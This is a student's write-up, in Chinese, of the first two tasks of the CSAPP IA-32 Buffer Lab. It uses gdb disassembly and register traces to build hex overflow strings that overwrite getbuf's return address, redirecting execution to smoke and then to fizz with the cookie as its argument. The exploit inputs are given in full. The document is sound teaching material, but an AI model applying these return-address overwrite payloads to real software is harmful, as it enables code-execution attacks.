1. task1

解决思路和attack lab类似，不同的是IA-32下寄存器只有32位。

首先来看getbuf的汇编形式：

```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x080491f4 <+0>:		push   %ebp
   0x080491f5 <+1>:		mov    %esp,%ebp
   0x080491f7 <+3>:		sub    $0x38,%esp
   0x080491fa <+6>:		lea    -0x28(%ebp),%eax
   0x080491fd <+9>:		mov    %eax,(%esp)
   0x08049200 <+12>:	call   0x8048cfa <Gets>
   0x08049205 <+17>:	mov    $0x1,%eax
   0x0804920a <+22>:	leave  
   0x0804920b <+23>:	ret    
End of assembler dump.
```

注意这里一个特殊的地方就是这个leave指令，百度查它的语义：

```
leave ret指令详解
leave指令可以使栈做好返回的准备，它等价于mov %ebp,%esp，pop %ebp。首先是mov %ebp,%esp，当前保存的ebp的值使栈帧的栈底地址，所以这一句话的作用就是把esp给放回到调用者栈帧的栈顶，联系到进入函数时的语句mov %esp,%ebp，其实就是这个的逆过程，旨在恢复原来栈顶的状态。然后是pop %ebp，pop是对栈顶元素出栈，而现在的栈顶（也是栈底）存储的是调用者栈帧的栈底地址，这条指令就是把这一地址赋值给ebp（把被保存的ebp的值赋给寄存器ebp）。所以这句话就是恢复调用者栈帧的栈底，这样一来的话调用者栈帧旧基本上恢复到原来的状态了。
leave只是做好了返回的准备，我们调用完函数之后，调用者还需要接着向下执行指令，那么调用完函数以后就应该跳转到该函数的下一条指令的地址，我们的CALL指令就是先将下一条指令的地址入栈，然后跳转，这里ret的作用就是把那一个地址给弹出栈，并且跳转到地址对应的语句，再接着执行，这样一来一个函数就完整的执行了。
————————————————
版权声明：本文为CSDN博主「狍狍子」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/sakuraqwqqqqq/article/details/111879855
```

在来看具体行为：

分别在0x080491f7、0x0804920a、0x0804920b三处打上断点：

```
(gdb) b *0x080491f7
Breakpoint 1 at 0x80491f7
(gdb) b *0x0804920a
Breakpoint 2 at 0x804920a
(gdb) b *0x0804920b
Breakpoint 3 at 0x804920b
```

跑一下试试,, 顺便在第一个断点处看寄存器信息，为了清除起见，只保留了esp、ebp、eip三个寄存器的信息：

```
(gdb) run -u bovik
Starting program: /mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7

Breakpoint 1, 0x080491f7 in getbuf ()
(gdb) info r
...
esp            0x556835b0          0x556835b0 <_reserved+1037744>
ebp            0x556835b0          0x556835b0 <_reserved+1037744>
...                 
eip            0x80491f7           0x80491f7 <getbuf+3>
...
```

然后接着跑随便输入一个字符串：

```
(gdb) c
Continuing.
Type string:testString

Breakpoint 2, 0x0804920a in getbuf ()
(gdb) info r
...
esp            0x55683578          0x55683578 <_reserved+1037688>
ebp            0x556835b0          0x556835b0 <_reserved+1037744>
...
eip            0x804920a           0x804920a <getbuf+22>
...

(gdb) c
Continuing.

Breakpoint 3, 0x0804920b in getbuf ()
(gdb) info r
...
esp            0x556835b4          0x556835b4 <_reserved+1037748>
ebp            0x556835e0          0x556835e0 <_reserved+1037792>
...
eip            0x804920b           0x804920b <getbuf+23>
...
```

观察断点2的寄存器信息和断点3的寄存器信息，可以看到 leave函数就是将ebp的值——0x556835b0赋值给esp，此时esp=0x556835b0，然后栈顶再pop一下，此时esp=0x556835b4，然后执行ret。

那么我们只需要使得0x556835b4这个位置上是smoke函数的地址即可。

在第一个断点处，esp=0x556835b0，然后执行了：

```
0x080491f7 <+3>:		sub    $0x38,%esp
```

也就是说，字符串是从 0x556835b0 - 32 处开始输入的，而smoke函数的地址为0x08048c18，只需要使得输入字符串的栈结构如下即可：

![stack-task-1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stack-task-1.png)

那么输入字符串就是：

```
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
18 8c 04 08
```

试验：

```
cat task1.txt | ./hex2raw | ./bufbomb -u bovik
```

结果：

![res-task1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task1.png)



2. task2

和task1非常接近，只需要考虑把参数放在栈的哪个位置，首先来看fizz函数的代码：

```c
void fizz(int val)
{
	if (val == cookie) {
		printf("Fizz!: You called fizz(0x%x)\n", val);
		validate(1);
	} else
		printf("Misfire: You called fizz(0x%x)\n", val);
	exit(0);
}
```

看其汇编版本：

```
(gdb) disas fizz
Dump of assembler code for function fizz:
   0x08048c42 <+0>:		push   %ebp
   0x08048c43 <+1>:		mov    %esp,%ebp
   0x08048c45 <+3>:		sub    $0x18,%esp
   0x08048c48 <+6>:		mov    0x8(%ebp),%eax
   0x08048c4b <+9>:		cmp    0x804d108,%eax
   0x08048c51 <+15>:	jne    0x8048c79 <fizz+55>
   0x08048c53 <+17>:	mov    %eax,0x8(%esp)
   0x08048c57 <+21>:	movl   $0x804a4ee,0x4(%esp)
   0x08048c5f <+29>:	movl   $0x1,(%esp)
   0x08048c66 <+36>:	call   0x80489c0 <__printf_chk@plt>
   0x08048c6b <+41>:	movl   $0x1,(%esp)
   0x08048c72 <+48>:	call   0x804937b <validate>
   0x08048c77 <+53>:	jmp    0x8048c91 <fizz+79>
   0x08048c79 <+55>:	mov    %eax,0x8(%esp)
   0x08048c7d <+59>:	movl   $0x804a340,0x4(%esp)
   0x08048c85 <+67>:	movl   $0x1,(%esp)
   0x08048c8c <+74>:	call   0x80489c0 <__printf_chk@plt>
   0x08048c91 <+79>:	movl   $0x0,(%esp)
   0x08048c98 <+86>:	call   0x8048900 <exit@plt>
End of assembler dump.
```

在<+9>处执行的就是if (val == cookie)这个比较逻辑，也就是说让%eax中存着cookie就行，然后%eax中的值就是：

```
mov    0x8(%ebp),%eax
```

而ebp的值：

```
mov    %esp,%ebp
```

也就是说在ret时栈顶的位置+8

所以输入字符串的栈结构应为：

![stack-task-2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stack-task-2.png)

那么输入字符串就是：

```
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
42 8c 04 08
00 00 00 00
b7 b2 05 10
```

测试结果：

![res-task2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task2.png)

